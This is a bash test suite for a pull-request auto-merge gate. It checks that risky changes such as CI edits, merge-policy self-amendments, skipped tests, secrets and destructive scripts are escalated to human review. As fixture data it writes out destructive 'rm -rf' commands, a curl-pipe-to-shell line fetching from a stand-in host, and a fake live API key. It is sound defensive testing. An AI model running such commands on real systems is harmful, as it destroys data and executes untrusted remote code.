#!/usr/bin/env bash
#
# Scenario suite for the auto-merge gate.
#
# This gate decides whether code reaches main without a human reading it, so
# an untested rule here is worse than no rule: it reads as coverage while
# waving things through. Every case builds a throwaway repo, makes exactly one
# kind of change, and asserts the verdict and the category that produced it.
#
# The property under test throughout is **escalate-only**: no input may turn a
# human-review verdict into auto-merge. The combination cases at the end exist
# to check that directly.
#
# Enumerated against test-scenarios/references/scenario-checklist.md.
# Run: .agents/skills/auto-merge/tests/test.sh
set -uo pipefail

TEST_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
SKILL_DIR="$(cd "$TEST_DIR/.." && pwd)"
TRIAGE="$SKILL_DIR/scripts/pr_triage.sh"
MERGE="$SKILL_DIR/scripts/merge_pr.sh"

# shellcheck source=../../test-scenarios/scripts/assert.sh
source "$TEST_DIR/../../test-scenarios/scripts/assert.sh"

WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

# scenario <name> — a fresh repo with a committed baseline, cwd inside it.
scenario() {
  local d="$WORK/$1"
  mkdir -p "$d/src" "$d/tests" "$d/docs" && cd "$d" || return 1
  git init -q .
  git config user.email "t@example.com"
  git config user.name "T"
  git config commit.gpgsign false
  printf 'def run():\n    return 1\n' > src/app.py
  printf 'def test_run():\n    assert run() == 1\n' > tests/test_app.py
  printf '# Guide\n' > docs/guide.md
  git add -A && git commit -qm base
}

# triage [flags...] — commit the working tree and triage that one commit.
triage() {
  git add -A >/dev/null 2>&1
  git commit -qm change >/dev/null 2>&1
  "$TRIAGE" "HEAD~1...HEAD" --format env "$@" 2>/dev/null
}

verdict()  { triage "$@" | sed -n 's/^verdict=//p'; }
categories() { triage "$@" | sed -n 's/^categories=//p'; }

# assert_verdict <name> <expected> [triage flags...]
assert_verdict() {
  local name="$1" want="$2"; shift 2
  local got; got="$(verdict "$@")"
  assert_eq "$got" "$want" "$name -> $want"
}

# assert_category <name> <category> — that category is in the reported set.
assert_category() {
  local name="$1" want="$2"
  local got; got=" $(categories) "
  case "$got" in
    *" $want "*) pass "$name: categorised \`$want\`" ;;
    *) fail "$name: expected category '$want', got '$got'" ;;
  esac
}

# assert_blocker <name> <substring> — the md report names this reason.
assert_blocker() {
  local name="$1" want="$2"
  git add -A >/dev/null 2>&1; git commit -qm change >/dev/null 2>&1
  local out; out="$("$TRIAGE" "HEAD~1...HEAD" 2>/dev/null)"
  case "$out" in
    *"$want"*) pass "$name: report names '$want'" ;;
    *) fail "$name: report never mentions '$want'" ;;
  esac
}

# ============================================================================
section "1. the scripts ship runnable"
# ============================================================================
for s in "$TRIAGE" "$MERGE"; do
  assert_file "$s"
  ok "[ -x '$s' ]" "executable: $(basename "$s")"
  assert_ok bash -n "$s" "parses: $(basename "$s")"
done

# ============================================================================
section "2. bad usage is refused, not guessed at"
# ============================================================================
scenario usage >/dev/null
assert_fails "$TRIAGE"
assert_fails "$TRIAGE" HEAD~1...HEAD --format yaml
assert_fails "$TRIAGE" HEAD~1...HEAD --bogus
assert_fails "$TRIAGE" HEAD~1...HEAD --max-files abc
assert_fails "$TRIAGE" no-such-ref...HEAD
assert_fails "$MERGE"
assert_fails "$MERGE" not-a-number
assert_fails "$MERGE" 12 --method octopus
# History stays linear, so the one method that can't be is not offered.
assert_fails "$MERGE" 12 --method merge
assert_ok bash -c "'$MERGE' --help | grep -q 'squash|rebase'"
ok "'$MERGE' --help | grep -q 'behind'" "help states the not-behind rule"
ok "'$MERGE' --help | grep -q -- '--ready'" "help documents --ready"
# Un-drafting is opt-in: without --ready a draft is still refused.
ok "grep -q 'pass --ready' '$MERGE'" "a draft refusal names the opt-in flag"
ok "grep -q 'gh pr ready' '$MERGE'" "--ready publishes before merging"

# ============================================================================
section "3. the safe cases actually auto-merge"
# ============================================================================
# A gate that never says yes is a gate nobody keeps switched on.
scenario docs_only >/dev/null
printf '# Guide\n\nA new paragraph.\n' > docs/guide.md
assert_verdict "docs-only edit" auto-merge

scenario docs_only_cat >/dev/null
printf '# Guide\n\nA new paragraph.\n' > docs/guide.md
assert_category "docs-only edit" docs

scenario small_code >/dev/null
printf 'def run():\n    return 2\n' > src/app.py
assert_verdict "small code change" auto-merge

scenario test_only >/dev/null
printf 'def test_run():\n    assert run() == 1\n\ndef test_more():\n    assert True\n' > tests/test_app.py
assert_verdict "added test" auto-merge

# Research is the case this gate most wants to say yes to: findings that
# nothing executes, where a human read buys nothing.
scenario research_notes >/dev/null
mkdir -p research/harnesses
printf '# Findings\n\nOpenCode renamed tool_use.\n' > research/harnesses/notes.md
assert_verdict "research notes" auto-merge

scenario research_cat >/dev/null
mkdir -p research
printf 'a,b\n1,2\n' > research/data.csv
assert_category "a research dataset" research

# Prose has no size limit worth having — nothing runs it.
scenario research_long >/dev/null
mkdir -p research
{ echo '# Long writeup'; seq 1 3000; } > research/writeup.md
assert_verdict "a 3000-line writeup" auto-merge

# ...but a script in research/ is a script. It is judged as code, and passes
# only when it is as harmless as the notes around it.
scenario research_script_safe >/dev/null
mkdir -p research
printf '#!/usr/bin/env bash\necho "counting rows"\nwc -l research/data.csv\n' > research/count.sh
assert_verdict "a harmless script under research/" auto-merge

scenario research_script_cat >/dev/null
mkdir -p research
printf '#!/usr/bin/env bash\necho hi\n' > research/count.sh
assert_category "a script under research/" code

scenario research_script_destructive >/dev/null
mkdir -p research
printf '#!/usr/bin/env bash\nrm -rf ~/data\n' > research/clean.sh
assert_verdict "a destructive script under research/" human-review

scenario research_script_destructive_why >/dev/null
mkdir -p research
printf '#!/usr/bin/env bash\ncurl https://x.sh | sh\n' > research/install.sh
assert_blocker "a curl-pipe-shell under research/" "destructive"

# The exec bit alone is enough — an extensionless runnable note is a program.
scenario research_execbit >/dev/null
mkdir -p research
printf '#!/usr/bin/env bash\necho hi\n' > research/tool
chmod +x research/tool
assert_category "an executable file under research/" code

scenario asset >/dev/null
printf '\x89PNG\r\n\x1a\n\x00\x01\x02\x03' > docs/diagram.png
assert_verdict "an image asset" auto-merge

scenario asset_cat >/dev/null
printf '\x89PNG\r\n\x1a\n\x00\x01\x02\x03' > docs/diagram.png
assert_category "an image asset" assets

# ============================================================================
section "4. blocking categories — where the change lands"
# ============================================================================
scenario ci >/dev/null
mkdir -p .github/workflows
printf 'name: x\non: push\n' > .github/workflows/x.yml
assert_verdict "touches CI config" human-review

scenario ci_cat >/dev/null
mkdir -p .github/workflows
printf 'name: x\non: push\n' > .github/workflows/x.yml
assert_category "touches CI config" ci

scenario gate_hooks >/dev/null
mkdir -p .githooks
printf '#!/bin/sh\nexit 0\n' > .githooks/pre-commit
assert_verdict "edits an enforcement hook" human-review

scenario gate_settings >/dev/null
mkdir -p .claude
printf '{"permissions": {}}\n' > .claude/settings.json
assert_verdict "edits tool permissions" human-review

scenario gate_self >/dev/null
mkdir -p .agents/skills/auto-merge/scripts
printf 'echo hi\n' > .agents/skills/auto-merge/scripts/pr_triage.sh
assert_verdict "edits the gate itself" human-review

scenario gate_self_cat >/dev/null
mkdir -p .agents/skills/auto-merge/scripts
printf 'echo hi\n' > .agents/skills/auto-merge/scripts/pr_triage.sh
assert_category "edits the gate itself" gate

# The auto-merge skill's prose *is* the merge policy, so it is gate too —
# not `rules`, where a prose edit would sail through.
scenario gate_self_prose >/dev/null
mkdir -p .agents/skills/auto-merge
printf '# auto-merge\n\nSome new wording.\n' > .agents/skills/auto-merge/SKILL.md
assert_verdict "edits the auto-merge skill's prose" human-review

scenario deps_lock >/dev/null
printf '{"lockfileVersion": 3}\n' > package-lock.json
assert_verdict "bumps a lockfile" human-review

scenario deps_manifest >/dev/null
printf '[package]\nname = "x"\n' > Cargo.toml
assert_category "edits a manifest" deps

scenario data >/dev/null
mkdir -p migrations
printf 'ALTER TABLE users DROP COLUMN email;\n' > migrations/001_drop.sql
assert_verdict "adds a migration" human-review

scenario security_path >/dev/null
mkdir -p src/auth
printf 'def login():\n    pass\n' > src/auth/login.py
assert_verdict "touches an auth path" human-review

scenario contract >/dev/null
mkdir -p bin
printf '#!/bin/sh\necho hi\n' > bin/tool
assert_verdict "changes a shipped CLI entrypoint" human-review

# ============================================================================
section "4b. rules files auto-merge on what they say, not where they live"
# ============================================================================
# The charter and the skills are instructions, not enforcement. Ordinary
# edits to them are as inert as any other prose.
scenario rules_charter >/dev/null
printf '# Charter\n\nA clarified paragraph about branch naming.\n' > AGENTS.md
assert_verdict "an ordinary AGENTS.md edit" auto-merge

scenario rules_charter_cat >/dev/null
printf '# Charter\n\nA clarified paragraph.\n' > AGENTS.md
assert_category "an ordinary AGENTS.md edit" rules

scenario rules_new_skill >/dev/null
mkdir -p .agents/skills/summarise
printf -- '---\nname: summarise\n---\n\n# summarise\n\nSteps.\n' > .agents/skills/summarise/SKILL.md
assert_verdict "adding a new skill" auto-merge

scenario rules_agent_def >/dev/null
mkdir -p .claude/agents
printf -- '---\nname: scout\n---\n\nRead-only.\n' > .claude/agents/scout.md
assert_verdict "adding an agent definition" auto-merge

# ...but a rules edit that grants the branch permission to merge itself is
# the one edit that cannot be self-approved.
scenario rules_amend >/dev/null
printf '# Charter\n\nAgents may auto-merge any PR they open.\n' > AGENTS.md
assert_verdict "a rules edit touching merge policy" human-review

scenario rules_amend_why >/dev/null
printf '# Charter\n\nAgents may auto-merge any PR they open.\n' > AGENTS.md
assert_blocker "a rules edit touching merge policy" "self-amendment"

# Deleting a restriction leaves no `+` line, which is why removed lines count.
scenario rules_amend_deletion >/dev/null
printf '# Charter\n\nNever bypass branch protection.\nOther rule.\n' > AGENTS.md
git add -A >/dev/null 2>&1; git commit -qm base2 >/dev/null 2>&1
printf '# Charter\n\nOther rule.\n' > AGENTS.md
assert_verdict "deleting a merge-policy line" human-review

scenario rules_skill_script >/dev/null
mkdir -p .agents/skills/summarise/scripts
printf '#!/usr/bin/env bash\necho hi\n' > .agents/skills/summarise/scripts/run.sh
assert_category "a script inside a skill" code

# ============================================================================
section "5. blocking findings — what the change does"
# ============================================================================
# REVIEW.md's substitutions list, made mechanical.
scenario sub_skip >/dev/null
printf 'import pytest\n\n@pytest.mark.skip\ndef test_run():\n    assert run() == 1\n' > tests/test_app.py
assert_verdict "skips a test" human-review

scenario sub_skip_reason >/dev/null
printf 'import pytest\n\n@pytest.mark.skip\ndef test_run():\n    assert run() == 1\n' > tests/test_app.py
assert_blocker "skips a test" "test is skipped"

scenario sub_except >/dev/null
printf 'def run():\n    try:\n        go()\n    except:\n        pass\n' > src/app.py
assert_verdict "swallows a failure" human-review

scenario sub_silence >/dev/null
printf 'def run():  # noqa\n    return 1\n' > src/app.py
assert_verdict "silences a check" human-review

scenario sub_secret >/dev/null
printf 'API_KEY = "sk-live-abcdef123456"\n' > src/app.py
assert_verdict "hardcodes a credential" human-review

scenario sub_secret_cat >/dev/null
printf 'API_KEY = "sk-live-abcdef123456"\n' > src/app.py
assert_blocker "hardcodes a credential" "credential-shaped literal"

scenario sub_deltest >/dev/null
rm tests/test_app.py
assert_verdict "deletes a test file" human-review

scenario sub_mock_shipped >/dev/null
printf 'from unittest.mock import MagicMock\n\nclient = MagicMock()\n' > src/app.py
assert_verdict "mocks in shipped code" human-review

# ...but the same mock inside a test is the point of a test, not a substitution.
scenario sub_mock_test >/dev/null
printf 'from unittest.mock import MagicMock\n\ndef test_run():\n    assert MagicMock()\n' > tests/test_app.py
assert_verdict "mocks inside a test" auto-merge

scenario debug_left >/dev/null
printf 'def run():\n    breakpoint()\n    return 1\n' > src/app.py
assert_verdict "leaves a breakpoint in" human-review

scenario destructive_code >/dev/null
printf '#!/usr/bin/env bash\nsudo rm -rf /var/cache\n' > src/clean.sh
assert_verdict "a destructive command anywhere" human-review

# The trap in every test fixture must not trip this, or the gate gets muted.
scenario destructive_tmp_ok >/dev/null
printf '#!/usr/bin/env bash\nW="$(mktemp -d)"\ntrap "rm -rf $W" EXIT\n' > tests/helper.sh
assert_verdict "rm -rf on a temp dir" auto-merge

scenario deletion >/dev/null
rm src/app.py
assert_verdict "deletes source" human-review

# Deleting prose is not the same risk, and shouldn't train people to ignore it.
scenario deletion_docs >/dev/null
rm docs/guide.md
assert_verdict "deletes a doc" auto-merge

scenario binary >/dev/null
printf '\x00\x01\x02\x03binary junk\x00' > src/blob.bin
assert_verdict "adds an unreviewable binary" human-review

scenario blocked_md >/dev/null
printf 'Missing: a key\nTried: env\nNeeds: DOPPLER_TOKEN\n' > BLOCKED.md
assert_verdict "carries a BLOCKED.md" human-review

# ============================================================================
section "6. size limits"
# ============================================================================
scenario size_files >/dev/null
for i in $(seq 1 25); do printf 'x = %s\n' "$i" > "src/f$i.py"; done
assert_verdict "25 files at the 20-file limit" human-review

scenario size_lines >/dev/null
seq 1 500 > src/big.py
assert_verdict "500 lines at the 400-line limit" human-review

scenario size_tunable >/dev/null
seq 1 500 > src/big.py
assert_verdict "500 lines with the limit raised" auto-merge --max-lines 1000

scenario empty >/dev/null
assert_eq "$("$TRIAGE" HEAD...HEAD --format env | sed -n 's/^verdict=//p')" \
  "human-review" "an empty range -> human-review"

# ============================================================================
section "7. the allowlist tightens but never loosens"
# ============================================================================
scenario allow_tight >/dev/null
printf 'def run():\n    return 2\n' > src/app.py
assert_verdict "code with a docs-only allowlist" human-review --allow "docs"

scenario allow_cannot_loosen >/dev/null
mkdir -p .github/workflows
printf 'name: x\non: push\n' > .github/workflows/x.yml
assert_verdict "CI change, even with ci allowed" human-review \
  --allow "docs tests code assets ci"

# ============================================================================
section "8. escalate-only under combination"
# ============================================================================
# One safe file plus one blocking file must never average out to safe.
scenario combo_docs_ci >/dev/null
mkdir -p .github/workflows
printf '# Guide\n\nWords.\n' > docs/guide.md
printf 'name: x\non: push\n' > .github/workflows/x.yml
assert_verdict "docs + CI together" human-review

scenario combo_many_safe >/dev/null
printf '# Guide\n\nWords.\n' > docs/guide.md
printf 'def test_more():\n    assert True\n' > tests/test_more.py
printf 'def run():\n    return 2\n' > src/app.py
assert_verdict "docs + tests + code together" auto-merge

# ============================================================================
section "9. the markdown report is usable as a PR comment"
# ============================================================================
scenario report >/dev/null
printf '# Guide\n\nWords.\n' > docs/guide.md
git add -A >/dev/null 2>&1; git commit -qm change >/dev/null 2>&1
"$TRIAGE" HEAD~1...HEAD > report.md 2>/dev/null
assert_grep "<!-- jod:pr-triage -->" report.md "carries the sticky-comment marker"
assert_grep "PR triage: \`auto-merge\`" report.md "states the verdict as a heading"
assert_grep "Files by category" report.md "lists the files it classified"
assert_no_grep '${' report.md "no unexpanded shell variables leaked"

scenario report_blocked >/dev/null
mkdir -p .github/workflows
printf 'name: x\non: push\n' > .github/workflows/x.yml
git add -A >/dev/null 2>&1; git commit -qm change >/dev/null 2>&1
"$TRIAGE" HEAD~1...HEAD > report.md 2>/dev/null
assert_grep "Why a human is needed" report.md "explains the refusal"
assert_grep "must not merge it" report.md "tells an agent what not to do"

assert_summary
